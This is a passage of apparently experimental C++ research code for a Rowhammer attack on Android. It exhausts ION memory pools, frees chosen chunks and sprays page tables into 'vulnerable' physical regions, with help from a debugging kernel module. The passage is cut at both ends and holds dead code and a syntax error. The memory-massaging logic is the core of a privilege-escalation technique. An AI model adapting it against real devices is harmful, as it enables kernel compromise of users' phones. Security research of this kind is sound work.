            if (close(pt_alloc_fd) == -1) {
                perror("Could not close PT_ALLOC_FILE");
                exit(EXIT_FAILURE);
            }

            pt_alloc_fd = open(PT_ALLOC_FILE, O_RDONLY);
            if (pt_alloc_fd == -1) {
                perror("Could not open PT_ALLOC_FILE");
                exit(EXIT_FAILURE);
            }
        }

        pt_alloc_mapping = mmap((void *) PT_ALLOC_VIRT_BASE, G2, PROT_READ, 
                                      MAP_SHARED | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    
        if (pt_alloc_mapping == MAP_FAILED) {
            perror("Could not mmap for PT allocation");
            exit(EXIT_FAILURE);
        }
    }

    char c;
    uint32_t virt1 = (uint32_t) pt_alloc_mapping + ( pt_alloc_offset    * M1);
    uint32_t virt2 = (uint32_t) pt_alloc_mapping + ((pt_alloc_offset+1) * M1);
    uint64_t t1 = get_ns();
    memcpy(&c, (void *) virt1, 1); assert(c == 0);
    memcpy(&c, (void *) virt2, 1); assert(c == 0);
    uint64_t t2 = get_ns();
//  printf("%llu\n", (t2 - t1));

    pt_alloc_offset += 2;

    return virt1;
}


void ion_exhaust(size_t len, std::vector<struct ion_data> &chunks, int max_allocations = 0, uint64_t  max_delta = 0, bool do_mmap = false, bool dump_deltas = false) {
    struct ion_data data;
    int i = 0;
    while (true) {
        uint64_t t1 = get_ns();
        int err = ion_alloc_and_map(len, &data, do_mmap);
        uint64_t t2 = get_ns();
        if (err) break; /* only set if out of memory */
        
        uint64_t delta = t2 - t1;
//      printf("%llu ", (t2 - t1) / 1000);
        if (dump_deltas) {
            printf("%15d %15llu\n", i, delta);
        }

        chunks.push_back(data);
        i++;
        if (max_allocations > 0 && i == max_allocations) break;
        if (max_delta > 0 && delta > max_delta) break;
    }
//  printf("\n");
}

size_t read_meminfo(std::string type) {
    meminfo.clear();
    meminfo.seekg(0, std::ios::beg);
    for (std::string line; getline(meminfo, line); ) {
        if (line.find(type) != std::string::npos) {
            std::string kb = line.substr( line.find(':') + 1, line.length() - type.length() - 3 );
            return std::stoi(kb);
        }
    }
    return 0;
}
size_t get_MemTotal(void) { return read_meminfo("MemTotal"); }
size_t get_MemFree(void) { return read_meminfo("MemFree"); }
size_t get_Buffers(void) { return read_meminfo("Buffers"); }
size_t get_Cached(void) { return read_meminfo("Cached"); }
size_t get_Active(void) { return read_meminfo("Active"); }
size_t get_Inactive(void) { return read_meminfo("Inactive"); }
size_t get_Slab(void) { return read_meminfo("Slab"); }
size_t get_SReclaimable(void) { return read_meminfo("SReclaimable"); }
size_t get_SUnreclaim(void) { return read_meminfo("SUnreclaim"); }


#if 0
#ifdef MSM
    mapping_size = 4 * 1024 * 1024;
    allocation_data.len = mapping_size;
#ifdef ARM7
    allocation_data.heap_mask = (0x1 << 21);
    /* 0.. 20 -> No such device
     *     21 -> v                                          // SYSTEM_CONTIG
     *     22 -> v                                          // ADSP
     *     23 -> No such device
     *     24 -> No such device
     *     25 -> v                                          // IOMMU
     *     26 -> No such device
     *     27 -> v                                          // QSECOM
     *     28 -> Cannot allocate memory                     // AUDIO
     *     29 -> No such device             
     *     30 -> v                                          // SYSTEM
     *     31 -> No such device
     */
    allocation_data.flags = 0;
#else
    /* 0.. 20 -> No such device
     *     21 -> Out of memory (when trying to allocate 10MB)  // SYSTEM_CONTIG
     *     22 -> v                                             // ADSP
     *     23 -> No such device                             
     *     24 -> No such device
     *     25 -> v                                             // SYSTEM
     *     26 -> No such device
     *     27 -> v                                             // QSECOM
     *     28 -> Operation not permited                        // AUDIO 
     * 29..31 -> No such device
     */
    allocation_data.heap_id_mask = (0x1 << 27);
    allocation_data.flags = ION_FLAG_FORCE_CONTIGUOUS;
#endif // ARM7
#endif // MSM


#ifdef EXONYS
/* from exynos_ion.h: */
#define SYSTEM_ID      0
#define CONTIG_ID      4
#define CARVEOUT_ID    CONTIG_ID
#define EXYNOS_ID      5
#define CHUNK_ID       6  
    mapping_size = 4 * 1024 * 1024;
    allocation_data.len = mapping_size;
    allocation_data.heap_id_mask = (0x1 <<  CHUNK_ID);
    allocation_data.flags = ION_FLAG_CACHED_NEEDS_SYNC;
#endif
#endif

bool child_running = false;
bool child_cannot_alloc_64k = false;

void term_handler(int signum) {
    printf("<CHILD> my pid is %u and I received a SIGTERM\n", getpid());

    std::vector<uint32_t> pts;
    while (1) {
        uint32_t pt = pt_alloc();
        pts.push_back(pt);
        if (pts.size() > 1000) {
            printf("allocating %d PTs\n", pts.size());
            kill(getppid(), SIGUSR1);
            while (1) {
                sleep(10);
            }
        }

        struct ion_data m2_alloc;
        memset(&m2_alloc, 0, sizeof(struct ion_data));
        m2_alloc.handle = ion_alloc(M2);
        if (m2_alloc.handle == NULL) {
            break;
        }
        ion_free(m2_alloc.handle);
    }

    /* send positive response */
    printf("Done, sending SIGUSR2 to parent %d\n", getppid());
    kill(getppid(), SIGUSR2);
    while (1) {
        sleep(10);
    }
}

bool child_working;
bool child_found_something;

void child_response_handler(int signum) {
    printf("PARENT received a SIGUSR1\n");
    child_working = false;
}

void child_found_something_handler(int signum) {
    printf("PARENT received a SIGUSR2\n");
    child_working = false;
    child_found_something = true;
}



int main(int argc, char** argv) {

    printf("ION_IOC_FREE: %u\n", ION_IOC_FREE);
    marker_fd = open("/sys/kernel/debug/tracing/trace_marker", O_WRONLY);
    if (marker_fd < 0) {
        perror("Could not open trace marker\n");
        exit(EXIT_FAILURE);
    }
    // Turn off stdout buffering when it is a pipe.
    setvbuf(stdout, NULL, _IONBF, 0);

#ifdef FORK_TEST
#define FORK_COUNT 100
    printf("FORK TEST. my pid is %u\n", getpid());

    std::vector<int> child_pids;

    for (int i = 0; i < FORK_COUNT; i++) {
        int child_pid = fork();
        if (child_pid == -1) {
            perror("Could not fork");
            exit(EXIT_FAILURE);
        }
        if (child_pid == 0) {
            /* child */
            struct sigaction action;
            memset(&action, 0, sizeof(struct sigaction));
            action.sa_handler = term_handler;
            sigaction(SIGTERM, &action, NULL);
            while (1) {
                sleep(10);
            }
        } else {
            printf("Forked child with pid %u\n", child_pid);
            child_pids.push_back(child_pid);
        }
    }
    
    printf("<PARENT> done forking %d children, sleeping a bit...\n", FORK_COUNT);
    sleep(1);
    printf("<PARENT> sending SIGTERM to all children\n");
    for (int i = 0; i < 100; i++) {
        kill(child_pids[i], SIGTERM);
    }
    printf("<PARENT> done killing children, sleeping a bit...\n");
    sleep(1);
    printf("<PARENT> done\n");

    return 0;

#endif // FORK_TEST

#ifdef PERF
    printf(("[!] Opening perf...\n");
    perf_fd = open_perf();
    if (perf_fd < 0) {
        perror("Could not open perf\n");
        exit(EXIT_FAILURE);
    }
#endif

#ifdef PINNING
    printf("[!] Pinning to CPU...\n");
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(0, &cpuset);
    sched_setaffinity(0, sizeof(cpuset), &cpuset);
#endif
    
    printf("[!] Opening pagemap...\n");
    pagemap_fd = open("/proc/self/pagemap", O_RDONLY);
    if (pagemap_fd < 0) {
        printf("[!] --> Could not open pagemap. Continuing without.\n");
    }

    kmsg_fd = open("/dev/kmsg", O_RDWR);
    if (kmsg_fd < 0) {
        printf("[!] --> Could not open kmsg\n");
    }

#ifdef USE_LKM
    printf("[!] Connecting to rowhammer kernel module /dev/rh...\n");
    rh_fd = open("/dev/rh", O_RDONLY);
    if (rh_fd < 0) 
    {
        perror("Could not open /dev/rh");
        exit(EXIT_FAILURE);
    }
    
#endif
#ifdef USE_LIBFLUSH
    printf("[!] Initializing libflush...\n");
    libflush_init();
#endif

    printf("[!] Starting the testing process...\n");


#ifdef FIND_SIDECHANNEL
    printf("[!] Looking for contigiuous memory sidechannel..\n");
    contiguous_sidechannel();

    return 0;
#endif
    
    uint64_t mapping_size;
    void *mapping;
#ifdef ION
    ion_fd = open("/dev/ion", O_RDONLY);
    if (!ion_fd) {
        perror("Could not open ion");
        exit(EXIT_FAILURE);
    }

#ifdef ION_4K_ALLOC_TIME
/*
 *
    for (int i = i; i < 1000000; i++) {
        uint64_t t1 = get_ns();
        mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_POPULATE | MAP_ANONYMOUS, -1, 0);
        uint64_t t2 = get_ns();

        if (mapping == MAP_FAILED) {
            perror("meh");
            exit(EXIT_FAILURE);
        }

        printf("%14d %15llu %15zu %15zu\n", i, (t2 - t1), get_Cached(), get_MemFree());
    }
    printf("doei\n");
    return 0;
*/
    printf("4K allocations      delta (ns)\n");
    for (int i = 0; i < 500000; i++) {
        struct ion_data data;

        uint64_t t1 = get_ns();
        int err = ion_alloc_and_map(M1, &data, true); 
        if (err) break;
        uint64_t t2 = get_ns();

        printf("%14d %15llu %15zu %15zu\n", i, (t2 - t1), get_Cached(), get_MemFree());
    }
    return 0;
#endif // ION_4K_ALLOC_TIME

#if 0
    write(kmsg_fd, "MARKER\n", 7);

    int pt_count = 0;
    int i = 0;
    while (1) {
        pt_alloc();
        i++;
        printf("i: %d\n", i);
    }
    write(kmsg_fd, "DONE\n", 6);
    exit;
    void *initmap = mmap((void *)0x10000000, 8*1024*1024, PROT_READ | PROT_WRITE,
                                               MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED, -1, 0);
       
//    struct ion_data ion_4MB;
//    ion_alloc_and_map(M4, &ion_4MB, true);

    exit(0);
    printf("initmap: %p\n", initmap);
    uint32_t last_pgmp = 0;
    for (int i = 0; i < M4; i = i + M1) {
        uint32_t virt = (uint32_t) initmap + i;
        uint32_t phys = get_phys_addr((uintptr_t) virt);
        uint32_t pgmp = ioctl(rh_fd, RH_IOC_GET_PT, virt);
        uint32_t diff = pgmp - last_pgmp;
        /*
        if (diff = 0x400) {
            uint32_t nxt1 = pgmp + 1024;
            uint32_t nxt2 = nxt1 + 1024;
            uint32_t nxt3 = nxt2 + 1024;
            printf("pagmap at %p? -> %d\n", nxt1, ioctl(rh_fd, RH_IOC_IS_PT, nxt1));
            printf("pagmap at %p? -> %d\n", nxt2, ioctl(rh_fd, RH_IOC_IS_PT, nxt2));
            printf("pagmap at %p? -> %d\n", nxt3, ioctl(rh_fd, RH_IOC_IS_PT, nxt3));
        }
        */
        printf("initmap + %8d: %p - physical: %p - pagemap: %p (+%10x)\n", i, (void *) virt, (void *) phys, (void *) pgmp, diff);
        last_pgmp = pgmp;
    }


    exit(0);
#endif
    
    std::vector<struct ion_data> ion_4MB_chunks;
    std::vector<struct ion_data> ion_2MB_chunks;
    std::vector<struct ion_data> ion_1MB_chunks;
    std::vector<struct ion_data> ion_512KB_chunks;
    std::vector<struct ion_data> ion_256KB_chunks;
    std::vector<struct ion_data> ion_128KB_chunks;
    std::vector<struct ion_data> ion_64KB_chunks;
    std::vector<struct ion_data> ion_32KB_chunks;
    std::vector<struct ion_data> ion_16KB_chunks;
    std::vector<struct ion_data> ion_8KB_chunks;


    std::vector<struct ion_data> ion_4KB_chunks;
    std::vector<struct ion_data> ion_contig_4KB_chunks;
    std::vector<struct ion_data> vulnerable_64KB_chunks;
    std::vector<struct ion_data> vulnerable_32KB_chunks;
    std::vector<struct ion_data> vulnerable_16KB_chunks;
    std::vector<struct ion_data> vulnerable_8KB_chunks;
    std::vector<struct ion_data> vulnerable_4KB_chunks;
    std::vector<void *> page_chunks;
    std::vector<struct ion_data> pt_chunks;
    int victim;
    uint32_t victim_vis;

    /* install a signal handler for processing the child's response */
    struct sigaction action1, action2;
    memset(&action1, 0, sizeof(struct sigaction));
    action1.sa_handler = child_response_handler;
    sigaction(SIGUSR1, &action1, NULL);
    
    memset(&action2, 0, sizeof(struct sigaction));
    action2.sa_handler = child_found_something_handler;
    sigaction(SIGUSR2, &action2, NULL);


/*
    pt_alloc();
*/


    printf("[!] Exhausting 4MB...\n");
    ion_exhaust(M4,   ion_4MB_chunks); 
    /*
    int m4_allocs = 0;
    while (true) {
        int ret = ioctl(rh_fd, RH_IOC_ALLOC_4M, NULL);
        if (!ret) break;
        m4_allocs++;
    }
    printf("got %d 4M chunks\n", m4_allocs);
    */

/*    
    printf("[!] Exhausting 2MB...\n");
    ion_exhaust(M2,   ion_2MB_chunks); 

    printf("[!] Exhausting 1MB...\n");
    ion_exhaust(M1,   ion_1MB_chunks); 

    printf("[!] Exhausting 512KB...\n");
    ion_exhaust(K512, ion_512KB_chunks); 

    printf("[!] Exhausting 256KB...\n");
    ion_exhaust(K256, ion_256KB_chunks); 
*/
    printf("[!] Exhausting 128KB...\n");
    ion_exhaust(K128, ion_128KB_chunks); 

    printf("[!] Exhausting 64KB...\n");
    ion_exhaust(K64,  ion_64KB_chunks); 
    /*
    int k64_allocs = 0;
    while (true) {
        int ret = ioctl(rh_fd, RH_IOC_ALLOC_64K, NULL);
        if (!ret) break;
        k64_allocs++;
    }
    printf("got %d 64K chunks\n", k64_allocs);
    */
   
    
    
//    write(kmsg_fd, "START\n", 6);

    printf("[!] Deallocating vulnerable 128 chunk...\n");
//    victim_vis = ioctl(rh_fd, RH_IOC_FREE_64K, NULL);
    victim = 0; // for now, just a 'random' index to de-allocate 
    ion_open(&ion_128KB_chunks[victim]);
    victim_vis = get_phys_addr((uintptr_t) ion_128KB_chunks[victim].mapping);
    ion_clean(&ion_128KB_chunks[victim]); // remove the 128K chunk
    printf("[!] Vulnerable 128K chunk was at %p\n", victim_vis);


    sleep(5);
    ion_exhaust(K64, vulnerable_64KB_chunks, 1);

    ion_clean(&ion_4MB_chunks[0]);

#if 0
    printf("[!] Allocating 4Ks\n");
    int phys_4k_index = 0;
    uint32_t phys_4k;
    while (true) {
        phys_4k = ioctl(rh_fd, RH_IOC_ALLOC_4K, NULL);
//        printf("- got 4K at %p\n", phys_4k);
        printf(".");
        if (phys_4k >= victim_vis && phys_4k < victim_vis + K128) {
            printf("\n");
            phys_4k_index = (phys_4k - victim_vis) / 4096;
            printf("Got a 4K allocation at %p which is within the vulnerable 128K chunk %p at index %d\n", phys_4k, victim_vis, phys_4k_index);
            break;
        }
    }
        
    phys_4k = ioctl(rh_fd, RH_IOC_ALLOC_4K, NULL);
    phys_4k = ioctl(rh_fd, RH_IOC_ALLOC_4K, NULL);
    phys_4k = ioctl(rh_fd, RH_IOC_ALLOC_4K, NULL);
    phys_4k = ioctl(rh_fd, RH_IOC_ALLOC_4K, NULL);
    phys_4k = ioctl(rh_fd, RH_IOC_ALLOC_4K, NULL);
    phys_4k = ioctl(rh_fd, RH_IOC_ALLOC_4K, NULL);
    phys_4k = ioctl(rh_fd, RH_IOC_ALLOC_4K, NULL);
    phys_4k = ioctl(rh_fd, RH_IOC_ALLOC_4K, NULL);
#endif
    ion_open(&vulnerable_64KB_chunks[0]);
    uint32_t phys_64k = get_phys_addr((uintptr_t) vulnerable_64KB_chunks[0].mapping);
    printf("Got 64KB ION chunk at %p\n", phys_64k);
    if (phys_64k >= victim_vis && phys_64k < victim_vis + K128) {
        int phys_64k_index = (phys_64k - victim_vis) / 4096;
        printf("<-- within vulnerable 128K chunk at page index %d\n", phys_64k_index);
    }

    uint32_t phys_64k_pt = ioctl(rh_fd, RH_IOC_GET_PT, vulnerable_64KB_chunks[0].mapping);
    printf("PT at %p\n", phys_64k_pt);
    if (phys_64k_pt >= victim_vis && phys_64k_pt < victim_vis + K128) {
        int phys_64k_pt_index = (phys_64k_pt - victim_vis) / 4096;
        printf("<-- within vulnerable 128K chunk at index %d\n", phys_64k_pt_index);
    }



    ioctl(rh_fd, RH_IOC_FREE_ALL_4K, NULL);

    exit(0);




    printf("[!] Allocating shitloads of page tables\n");
    for (int i = 0; i < 1000; i++) {
        int child = fork();
        if (child == -1) { perror("Could not fork"); exit(0); }
        if (child == 0) {
            /* child */
            printf(" child calling 1000x pt_alloc\n");
            bool printed = false;
            int vulnerable_pts = 0;
            std::vector<uint32_t> vulnerable_virts;
            for (int i = 0; i < 1000; i++) {

                uint32_t virt = pt_alloc();


                uint32_t pt_phys = ioctl(rh_fd, RH_IOC_GET_PT, virt);
                if (pt_phys >= victim_vis && pt_phys < victim_vis + M1) {

                    printf("[!] [%d] Virtual address %p has a page table at %p\n", i, (void *) virt, (void *) pt_phys);
                    vulnerable_pts++;

                    if (vulnerable_pts < 16) vulnerable_virts.push_back(virt);

                    if (vulnerable_pts == 256) {
                        printf("-------------- no more hits below this line -------------\n");

                        kill(getppid(), SIGUSR2);
                        exit(0);
                        
                        printf("munmap...\n");
                        for (int i = 0; i < 16; i++) {
                            munmap((void *) vulnerable_virts[i], M2);
                        
                            struct ion_data k32_alloc;
                            memset(&k32_alloc, 0, sizeof(struct ion_data));
                            int err = ion_alloc_and_map(K32, &k32_alloc, true);
                            if (err) {
                                printf("could not allocate 32k. this should not happen\n");
                                exit(EXIT_FAILURE);
                            }
                            uint32_t k32_virt = (uint32_t) k32_alloc.mapping;
                            close(pagemap_fd);
                            pagemap_fd = open("/proc/self/pagemap", O_RDONLY);
                            uint32_t k32_phys = get_phys_addr((uintptr_t) k32_virt);
                            printf("  - allocated 16k ion chunk at virt %p | phys %p\n", 
                                            k32_virt, k32_phys);
                            exit(0);
//                          uint32_t k32_phys = 0;
                        }

                    }
/*
                    int is_pt = ioctl(rh_fd, RH_IOC_IS_PT, pt_phys);
                    printf("is_pt(%p): %d\n", (void *) pt_phys, is_pt);

                    printf("munmap...\n");
                    munmap((void *) virt, M2);
//                    madvise((void *) virt, M2, MADV_DONTNEED);
                    
                    is_pt = ioctl(rh_fd, RH_IOC_IS_PT, pt_phys);
                    printf("is_pt(%p): %d\n", (void *) pt_phys, is_pt);

                    exit(0);
*/
/*
        
                        uint32_t k32_pgmp = ioctl(rh_fd, RH_IOC_GET_PT, k32_virt);
                        ioctl(rh_fd, RH_IOC_DUMP_PHYS_PAGE, pt_phys);
                        */
 //                 exit(0);
//                    printed = true;
                }
            }

            printf(" child exhausted pt_alloc, sending signal to parent and sleeping indefinitely\n");
            kill(getppid(), SIGUSR1);
            while (1) {
                sleep(10);
            }
        } else {
            /* parent */
            printf("PARENT forked of child: %d - going to sleep\n", child);
            child_working = true;
            child_found_something = false;
            while (child_working) {
                sleep(1);
            }
            printf("PARENT woke up\n");
            if (child_found_something) {

                /* child found 256 PTs in the vulnerable region which are now free again. Grab them quickly */
                printf("[!] Exhausting 64KB...\n");
                ion_exhaust(K64, vulnerable_64KB_chunks, -1, -1, true);

                for (auto & chunk : vulnerable_64KB_chunks) {
                    uint32_t virt32 = (uint32_t) chunk.mapping;
                    uint32_t phys32 = get_phys_addr((uintptr_t) virt32);
                    uint32_t pt_phys32 = ioctl(rh_fd, RH_IOC_GET_PT, virt32);

                    printf("- got a 64K at virt %p - phys %p - pgmp at %p\n", (void *) virt32, (void *) phys32, (void *) pt_phys32);


                }
                    exit(0);



                
            }
        }
    }


    printf("[!] Allocating 4K PTs until we cannot allocate 2MB anymore...\n");
    std::vector<uint32_t> pts;
    while (1) {
//      ion_exhaust(K4, ion_4KB_chunks, 1);
        uint32_t pt = pt_alloc();
        pts.push_back(pt);
        if (pts.size() > 1000) {
        }
    }

#define REMAINDER 20
    printf("[!] Got %d PTs\n", pts.size());
    printf("[!] Allocating %dx 4K\n", REMAINDER);
    for (int i = 0; i < REMAINDER; i++) {
        uint32_t pt = pt_alloc();
        pts.push_back(pt);
    }
/*
    printf("[!] Got %d 4KBs\n", ion_4KB_chunks.size());
    vulnerable_4KB_chunks.push_back(ion_4KB_chunks.back());

    printf("[!] Mapping last 4K ION allocation\n");
    ion_open_all(vulnerable_4KB_chunks);
    ion_open_fixed_base = (void *) ((uint32_t) vulnerable_4KB_chunks[0].mapping + M1);

    printf("[!] Allocting and opening 15 more 4K ION chunks\n");
    ion_exhaust(K4, vulnerable_4KB_chunks, 15, 0, true);
*/
    printf("[!] Vulnerable 64KB chunk was at physical address: %p - %p\n", (void *) victim_vis, (void *) (victim_vis + K64));
    
    for (int i = 0; i < pts.size(); i++) {
        uint32_t phys = get_phys_addr((uintptr_t) pts[i]);
        uint32_t pt_phys  = ioctl(rh_fd, RH_IOC_GET_PT, pts[i]);
        uint32_t pt_phys2 = ioctl(rh_fd, RH_IOC_GET_PT, pts[i] + M1);
        printf("[!] - PT for virtual address %p is at physical address: %p\n", (void *) (pts[i]     ), (void *) pt_phys);
        if (pt_phys >= victim_vis && pt_phys < victim_vis + K64) printf("-------<<\n");
        printf("[!] - PT for virtual address %p is at physical address: %p\n", (void *) (pts[i] + M1), (void *) pt_phys2);
        if (pt_phys2 >= victim_vis && pt_phys2 < victim_vis + K64) printf("-------<<\n");
    }
   
/*
    for (int i = 0; i < vulnerable_4KB_chunks.size(); i++) {
        uint32_t virt = (uint32_t) vulnerable_4KB_chunks[i].mapping;
        uint32_t phys = get_phys_addr((uintptr_t)vulnerable_4KB_chunks[i].mapping);
        uint32_t pgmp = ioctl(rh_fd, RH_IOC_GET_PT, virt);
//      ioctl(rh_fd, RH_IOC_DUMP_PHYS_PAGE, pgmp);

        printf("[!] - 4K at %p has physical %p - pagemap at %p", (void *) virt, (void *) phys, (void *) pgmp);
        if (phys >= victim_vis && phys < victim_vis +K64) printf("        -----<<");
        printf("\n");
    }
  */  
    
    write(kmsg_fd, "EXIT\n", 5);

    exit(0);


    printf("[!] Dumping physical addresses of 4KB chunks\n");
    ion_open_all(ion_contig_4KB_chunks);
    uint32_t prev_vis = 0;
    int contig_count = 0;
    int best_index = 0;
#define ALLOCS_REQUIRED 32
    for (int i = 0; i < 511; i++) {
        uint32_t vis4kb = get_phys_addr((uintptr_t) ion_contig_4KB_chunks[i].mapping);
        if (vis4kb == prev_vis + 4096) {
            contig_count++;
            prev_vis = vis4kb;

            if (contig_count == ALLOCS_REQUIRED) {
                best_index = i - ALLOCS_REQUIRED;
                printf("got %d contiguous 4k allocation starting at index: %d\n", ALLOCS_REQUIRED, best_index);
                break;
            }
        } else {
            contig_count = 0;
            prev_vis = vis4kb;
        }
    }

    uint32_t k4_vis_start = get_phys_addr((uintptr_t) ion_contig_4KB_chunks[best_index].mapping);
    for (int i = best_index; i < best_index+ALLOCS_REQUIRED; i++) {
        uint32_t vis4kb = get_phys_addr((uintptr_t) ion_contig_4KB_chunks[i].mapping);
        printf("%p\n", (void *) vis4kb);
    }


    printf("[!] Exhausting 64 KB chunks\n");
    ion_exhaust(K64, ion_64KB_chunks);

    printf("[!] Releasing %d contiguous 4K allocations\n", ALLOCS_REQUIRED);
    for (int i = 0; i < ALLOCS_REQUIRED; i++) {
        ion_clean(&ion_contig_4KB_chunks[best_index + i]);
    }
        
    printf("[!] Allocating a 64KB chunk which should now be possible again. page table should come right after\n");
    struct ion_data tmp;
    tmp.handle = ion_alloc(K64);
    if (tmp.handle == NULL) {
        /* out of memory, allocated all available contiguous 64K chunks */
        perror("out of memory?\n");
        exit(EXIT_FAILURE);
    }
    tmp.fd = ion_share(tmp.handle);
    if (tmp.fd < 0) {
        perror("Could not share ion handle");
        exit(EXIT_FAILURE);
    }
    printf("mapping...\n");
    void *initmap;
    uint32_t addr = ((uint32_t) initmap) + (10 * 64*4096);
    tmp.mapping = mmap((void *)addr, K4, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE | MAP_FIXED, tmp.fd, 0);

    uint32_t k64_vis_start = get_phys_addr((uintptr_t) tmp.mapping);
    printf("%p ==? %p\n", (void *) k4_vis_start, (void *) k64_vis_start);
    if (k64_vis_start != k4_vis_start) {
        printf("meh\n");
    }
    
    
    unsigned long virt_pt = ioctl(rh_fd, RH_IOC_GET_PT, tmp.mapping);
//  printf("Page Table at virtual address: %p - physical: %p\n", (void *) virt_pt, (void *) get_phys_addr((uintptr_t) virt_pt));
       

    return 0;


    
    printf("[!] Exhaust contiguous memory...\n");
    /* Exhaust contiguous memory - this does not open and mmap yet */
    ion_exhaust(M4, ion_4MB_chunks);
    ion_exhaust(M2, ion_2MB_chunks);
    ion_exhaust(M1, ion_1MB_chunks);
    ion_exhaust(K512, ion_512KB_chunks);
    ion_exhaust(K256, ion_256KB_chunks);
    ion_exhaust(K128, ion_128KB_chunks);
    ion_exhaust(K64, ion_64KB_chunks);
    
    printf("[!] Deallocating vulnerable 4MB chunk and immediately claiming 64 64K chunks...\n");
    /* Deallocate a 4MB chunk and immediately allocate 64K chunks */
    victim = 2; // for now, just a 'random' index to de-allocate 
    ion_open(&ion_4MB_chunks[victim]);
    victim_vis = get_phys_addr((uintptr_t) ion_4MB_chunks[victim].mapping);
    ion_exhaust(K64, ion_64KB_chunks); // exhaust again, just to be sure. this should not give anything
    ion_clean(&ion_4MB_chunks[victim]); // remove the 4MB chunk
    ion_exhaust(K64, vulnerable_64KB_chunks, 0, 0, true); // exhaust 64K chunks
    ion_4MB_chunks.erase(ion_4MB_chunks.begin() + victim);

    printf("[!] 4MB chunk was at physical address: %p\n", (void *) victim_vis);
    printf("[!] Checking whether 64K chunks have correct physical address...\n");
    int correctly_mapped = 0;
    for (auto & chunk : vulnerable_64KB_chunks) {
        uint32_t vis = get_phys_addr((uintptr_t) chunk.mapping);
        if (vis >= victim_vis && vis <= victim_vis + M4 - 4096) {
            correctly_mapped++;
        } else {
            printf("[!] -> incorrect mapping: 64K at mva: %p | vis: %p\n", chunk.mapping, (void *) vis);
        }
    }
    if (correctly_mapped != 64) {
        printf("[!] Not all 64 64K chunks mapped into deallocated 4MB chunk (only %d)\n", correctly_mapped);
        exit(EXIT_FAILURE);
    }



    printf("[!] Deallocating all 128KB - 4MB chunks and allocating 4KB chunks until we cannot allocate 2MB anymore\n");
    ion_clean_all(ion_4MB_chunks);
    ion_clean_all(ion_2MB_chunks);
//    ion_clean_all(ion_1MB_chunks);
//    ion_clean_all(ion_512KB_chunks);
//    ion_clean_all(ion_256KB_chunks);
//    ion_clean_all(ion_128KB_chunks);
    while (1) {
        struct ion_data k4_alloc;
        k4_alloc.handle = ion_alloc(K4);
        if (k4_alloc.handle == NULL) {
            perror("Could not ion_alloc(4K)");
            exit(EXIT_FAILURE);
        }
        ion_4KB_chunks.push_back(k4_alloc);

        struct ion_data m2_alloc;
        m2_alloc.handle = ion_alloc(M2);
        if (m2_alloc.handle == NULL) {
            /* we filled the last available 2MB chunk with 1 4K page, fill the rest */
            for (int i = 0; i < 511; i++) {
                k4_alloc.handle = ion_alloc(K4);
                if (k4_alloc.handle == NULL) {
                    perror("Could not ion_alloc(4K)");
                    exit(EXIT_FAILURE);
                }
                ion_4KB_chunks.push_back(k4_alloc);
            }
            break;
        }
        ion_free(m2_alloc.handle);
    }

    
    
    printf("[!] Deallocating vulnerable 64KB chunk and immediately claiming 16 4K chunks...\n");
    /* Deallocate a 64KB chunk and immediately allocate 4K chunks */
    victim = 2; // for now, just a 'random' index to de-allocate 
    victim_vis = get_phys_addr((uintptr_t) vulnerable_64KB_chunks[victim].mapping);
    ion_clean(&vulnerable_64KB_chunks[victim]); // remove the 64KB chunk
    ion_exhaust(K4, vulnerable_4KB_chunks, 64);
    ion_open_all(vulnerable_4KB_chunks);
    vulnerable_64KB_chunks.erase(vulnerable_64KB_chunks.begin() + victim);


    /* find the vulnerable 4K pages */
    printf("[!] 64KB chunk was at physical address: %p\n", (void *) victim_vis);
    printf("[!] Checking whether 4K chunks have correct physical address...\n");
    correctly_mapped = 0; 
    int index = 0;
    for (auto & chunk : vulnerable_4KB_chunks) {
        uint32_t vis = get_phys_addr((uintptr_t) chunk.mapping);
        if (vis >= victim_vis && vis <= victim_vis + K64 - 4096) {
            correctly_mapped++;
            printf("[!] ->   correct mapping: 4K at mva: %p | vis: %p -- !!!\n", chunk.mapping, (void *) vis);
        } else {
            printf("[!] -> incorrect mapping: 4K at mva: %p | vis: %p\n", chunk.mapping, (void *) vis);
        }
    }
    if (correctly_mapped != 64) {
        printf("[!] Not all 4K chunks mapped into deallocated 64KB chunk (only %d)\n", correctly_mapped);
    }


    return 0;



    size_t freemem = get_MemFree();
    size_t small_pages = freemem / 4;
    printf("[!] Free memory left in chunks smaller than 64K: %zu MB (pages: %zu)\n", freemem / 1024, small_pages);
   
 
    printf("[!] Waiting for everything to settle...\n");
    for (int i = 3; i > 0; i--) { printf("."); sleep(1); } printf("\n");
    
    if (vulnerable_64KB_chunks.size() != 64) {
        printf("[!] Got an unexpected number of 64K allocations (%d instead of 64)\n", vulnerable_64KB_chunks.size());
//        exit(EXIT_FAILURE);
    }
    printf("[!] 4MB chunk was at physical address: %p\n", (void *) victim_vis);
    printf("[!] Checking whether 64K chunks have correct physical address...\n");
    correctly_mapped = 0;
    for (auto & chunk : vulnerable_64KB_chunks) {
        uint32_t vis = get_phys_addr((uintptr_t) chunk.mapping);
        if (vis >= victim_vis && vis <= victim_vis + M4 - 4096) {
            correctly_mapped++;
        } else {
            printf("[!] -> incorrect mapping: 64K at mva: %p | vis: %p\n", chunk.mapping, (void *) vis);
        }
    }
    if (correctly_mapped != 64) {
        printf("[!] Not all 64 64K chunks mapped into deallocated 4MB chunk (only %d)\n", correctly_mapped);
        exit(EXIT_FAILURE);
    }

    /* clean all large chunks to avoid OOM */
    printf("[!] Deallocting chunks of size 512K and up...\n");
//  ion_clean_all(ion_128KB_chunks);
//  ion_clean_all(ion_256KB_chunks);
    ion_clean_all(ion_512KB_chunks);
    ion_clean_all(ion_1MB_chunks);
    ion_clean_all(ion_2MB_chunks);
    ion_clean_all(ion_4MB_chunks);
    
    printf("[!] Waiting for everything to settle...\n");
    for (int i = 3; i > 0; i--) { printf("."); sleep(1); } printf("\n");

    printf("[!] Allocating at least %zu pages\n", small_pages);
    ion_exhaust(K4, ion_4KB_chunks, small_pages + 1024, BILLION, false, false);
    printf("[!] Allocated %zu pages\n", ion_4KB_chunks.size());
    
    printf("[!] Waiting for everything to settle...\n");
    for (int i = 3; i > 0; i--) { printf("."); sleep(1); } printf("\n");






    printf("[!] Deallocating vulnerable 64KB chunk and immediately claiming 16 4K chunks...\n");
